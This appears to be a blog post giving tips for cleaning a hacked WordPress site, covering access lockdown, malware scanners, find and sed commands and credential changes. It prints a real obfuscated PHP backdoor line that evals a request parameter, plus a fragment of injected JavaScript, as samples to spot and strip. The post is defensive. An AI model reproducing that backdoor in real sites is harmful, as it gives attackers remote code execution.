---
title: Cleaning a hacked Wordpess site
tags:
    - PHP
    - Web
    - Wordpress
---

If you are reading this, you may be in this situation:

> So you've carefully installed WordPress, you've made it look exactly how you like with a decent theme, you've maybe installed some fancy plugins and you've crafted some fine posts and Pages. In short, you've put a lot of time and effort into your site.
>
> Then, one day, you load up your site in your browser, and find that it's not there, or it redirects to a porn site, or your site is full of adverts for performance-enhancing drugs. It leaves you wondering, Why would anyone hack my website? What are you supposed to do now?
>
> The entire experience of being compromised can feel devastating, making you wonder why you ever decided to create an online presence. Rest assured though it is not the end of the world, and there a number of practical steps you can take to address the problem once it's happened, and / or prevent it from ever happening again.

You can read the [FAQ My site was hacked](https://codex.wordpress.org/FAQ_My_site_was_hacked)
from wordpress.org in order to deal with the hack. Other than that, *I will share some tips
you may use in order to clean your files*.

* Deactivate the site or make it accessible only from your IP by adding on top of `.htaccess`
  the following directives:

	    order deny,allow
	    deny from all
	    allow from W.X.Y.Z # this is your IP address

	This is a required step in order to block bots infecting more files.

* Create a backup (files and database) or make sure that a current, working, backup exists. 
  Useful if anything goes wrong.

* Use [maldet](https://www.rfxn.com/projects/linux-malware-detect/) and 
  [findbot.pl](http://www.abuseat.org/findbot.pl) via

		maldet -a /path/to/site
		/path/to/findbot.pl /path/to/site

* Manually examine the files ordered by modification date, look for strange patterns
  and act accordingly:

	    find /path/to/site -type f -printf '%T+\t%p\n' | sort -nr | less

* Look for strange patterns on top of php files:

    	for i in $(find /path/to/site -type f -name '*.php'); do echo "$i "; head -1 $i; echo ""; done | less -S

	When the files are something like this (real example):

	    <?php    $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['q828e00'])){eval(${$s20}['q828e00']);}?><?php

	you can clean with the following sed command:

    	sed 's/<?php.*/<?php/'
    	
	or enmasse:

		# WARNING: it may break non-infected files as well
    	for i in $(find /path/to/site -type f -name '*.php'); do sed -i.bckp 's/<?php.*/<?php/' "$i" ; done

* On bottom of php files:

		for i in $(find /path/to/site -type f -name '*.php'); do echo "$i "; tail -1 $i; echo ""; done | less -S 

* On bottom of javascript files:

		for i in $(find /path/to/site -type f -name '*.js'); do echo "$i "; tail -1 $i; echo ""; done | less -S

	if these files have infected with a pattern like this (real example):

		/*a3d5ba6096d839a2936a817de24fbf2d*/;(function(){var ttntdaye="";var ikkykrzk="...

	you can apply the following command:

		for i in $(find /path/to/site -type f -name '*.js'); do sed -i.bckp 's/\/\*\([a-zA-Z0-9]\{32\}\)\*\/.*//' "$i" ; done

	in order to remove the infection.

* Look for php files in `wp-content/uploads/` directory and remove them:

	    find /path/to/site/wp-content/uploads/ -name *.php

* Change database credentials, administrator(s) passwords and generate new keys from 
[the Wordpress key generator](https://api.wordpress.org/secret-key/1.1/salt/).

* If you are unsure about the cleaning procedure, one way to prevent bots from infecting more files
  is to change file ownership, like:

  		chown -R root:root /path/to/site
		chmod -R u+rw,go+r,go-w,+X /path/to/site

* When done, revert the change made to `.htaccess` and hope for the best. This is why backups 
 (both files and database), version control and updates are of utmost importance.
